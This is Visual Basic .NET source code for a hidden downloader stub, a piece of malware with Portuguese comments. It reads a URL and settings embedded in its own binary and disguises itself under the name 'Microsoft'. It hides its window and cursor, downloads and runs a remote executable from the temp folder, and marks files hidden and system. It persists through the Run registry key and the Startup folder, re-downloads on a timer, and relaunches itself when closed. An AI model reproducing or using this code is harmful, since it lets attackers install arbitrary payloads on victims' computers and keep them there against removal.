Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.IO
Imports System.Diagnostics
Imports System.Windows.Forms
Imports Microsoft.Win32
Imports System.Threading
Imports Microsoft.VisualBasic
Imports System.Runtime.CompilerServices
Imports System.Runtime
Imports System.Runtime.InteropServices
Imports Microsoft.VisualBasic.Devices
Imports System.Globalization
Imports System.Text


'Coded By pjoao1578
'32 e 64 bits
'recomended net frameworck 2.0 ou 4.5
'not recomended --> Make single instance application
Public Class URrL 'name
#Region "inports"
    Const spl = "MicrosoftCorporationSvchost" 'senha stub e cliente
    Public ala(), text1, text2 As String 'textbos
    Public add, add2 As String 'textbos
    Public check1 As Boolean = False 'cheboxs
    Public check2 As Boolean = False 'cheboxs
    Public hidemexe As Boolean = False 'cheboxs
    Public pesist As Boolean = False 'cheboxs
    Dim r As New Random 'rodom strigns
    Dim p As String = r.Next(0, 200) 'rodom numeros de 0 a 200
    Dim hidem As FileAttribute = FileAttribute.Hidden + FileAttribute.System + FileAttributes.ReadOnly + FileAttributes.Directory 'hide
    Public exe As Object = Application.ExecutablePath 'executavel exe(server)
    Public W As Object = New FileInfo(Application.ExecutablePath) 'executavel exe(server)
    Public W1 As Object = New FileInfo(Application.ExecutablePath).Name 'name do server exe(server.exe)
    Dim ta As New Antikill
    Dim st As New Threading.Thread(AddressOf ta.protect)
#End Region

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            FileOpen(1, exe, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared) 'open server
            text1 = Space$(LOF(1)) 'textbox1
            FileGet(1, text1) 'textbox1
            FileClose() 'close
            ala = Split(text1, spl)
            add = ala(1) 'textbox1
            add2 = ala(2) 'textbox2
            check1 = ala(3) 'checkbox1
            check2 = ala(4) 'checkbox2
            hidemexe = ala(5) 'checkbox3
            pesist = ala(6) 'checkbox4
            System.Windows.Forms.Control.CheckForIllegalCrossThreadCalls = False 'opcional
            Me.Text = "Microsoft" 'name de forme
            Windows.Forms.Cursor.Hide() 'hide
            MyClass.Hide() 'hide
            MyBase.Hide() 'hide
            Me.Hide() 'hide
            Me.Visible = False 'hide
            Me.ShowInTaskbar = False 'hide
        Catch ex As Exception 'clean erros
            ProjectData.SetProjectError(ex)
            ProjectData.EndApp() 'exit process
            ProjectData.ClearProjectError()
        End Try
        'baixar e executar arquivo baixado
        Try
            My.Computer.Network.DownloadFile(add, IO.Path.GetTempPath() & p & ".exe") 'baixar
            If hidemexe Then
                Try
                    IO.File.SetAttributes(exe, hidem) 'hide
                Catch ex As Exception 'erro nao report
                End Try
                Try
                    IO.File.SetAttributes(IO.Path.GetTempPath() & p & ".exe", hidem) 'hide
                Catch ex As Exception
                End Try
            End If
            Threading.Thread.Sleep(add2) 'sleep
            Try
                Diagnostics.Process.Start(IO.Path.GetTempPath() & p & ".exe") 'start server baixado
            Catch ex As Exception
            End Try
        Catch ex As Exception 'clean erros
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
        'add ao aranque do windows 
        If check1 Then
            Try
                Dim key As String = W1 ' nome que fica no aranque do windows = a add
                Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
                regKey.SetValue(key, exe, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
            Catch ex As Exception
                ProjectData.SetProjectError(ex)
                ProjectData.ClearProjectError()
            End Try
        End If
        'copy pra Startup
        If check2 Then
            Try
                IO.File.Copy(W.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & p & ".exe", True) 'auto copy pra To StartUp do windows
            Catch ex As Exception
                ProjectData.SetProjectError(ex)
                ProjectData.ClearProjectError()
            End Try
            If hidemexe Then
                Try 'hide
                    IO.File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & p & ".exe", hidem)
                Catch ex As Exception
                End Try
            End If
        End If
        'pestencia
        If pesist Then
            Dim t As System.Windows.Forms.Timer = Me.Timer1
            t.Interval = 20000 'tenpo
            t.Enabled = True
            t.Start() 'start/anti kill server protection
            t = Nothing
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick 'interval 20000
        If pesist Then
            Try
                My.Computer.Network.DownloadFile(add, IO.Path.GetTempPath() & p & ".exe") 'baixar
                If hidemexe Then
                    Try
                        IO.File.SetAttributes(exe, hidem) 'hide
                    Catch ex As Exception 'erro nao report
                    End Try
                    Try
                        IO.File.SetAttributes(IO.Path.GetTempPath() & p & ".exe", hidem) 'hide
                    Catch ex As Exception
                    End Try
                End If
                Threading.Thread.Sleep(add2) 'sleep
                Try
                    Diagnostics.Process.Start(IO.Path.GetTempPath() & p & ".exe") 'start server baixado
                Catch ex As Exception
                End Try
            Catch ex As Exception 'clean erros
                ProjectData.SetProjectError(ex)
                ProjectData.ClearProjectError()
            End Try
            If check1 Then
                Try 'add ao aranque do windows 
                    Dim key As String = W1 ' nome que fica no aranque do windows = a add
                    Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
                    regKey.SetValue(key, exe, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
                Catch ex As Exception
                    ProjectData.SetProjectError(ex)
                    ProjectData.ClearProjectError()
                End Try
            End If
            If check2 Then
                Try 'copy pra Startup
                    IO.File.Copy(W.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & p & ".exe", True) 'auto copy pra To StartUp do windows
                Catch ex As Exception
                    ProjectData.SetProjectError(ex)
                    ProjectData.ClearProjectError()
                End Try
                If hidemexe Then
                    Try 'hide
                        IO.File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & p & ".exe", hidem)
                    Catch ex As Exception
                    End Try
                End If
            End If
        End If
    End Sub

    Private Sub Form1_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        If pesist Then
            Try
                Diagnostics.Process.Start(exe.Clone) 'clone server
            Catch ex As Exception 'clean erros
                ProjectData.SetProjectError(ex)
                Diagnostics.Process.Start(exe.Clone) 'clone server
                ProjectData.ClearProjectError()
            End Try
        End If
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        If pesist Then
            Try
                Diagnostics.Process.Start(exe.Clone) 'clone server
            Catch ex As Exception 'clean erros
                ProjectData.SetProjectError(ex)
                Diagnostics.Process.Start(exe.Clone) 'clone server
                ProjectData.ClearProjectError()
            End Try
        End If
    End Sub
End Class


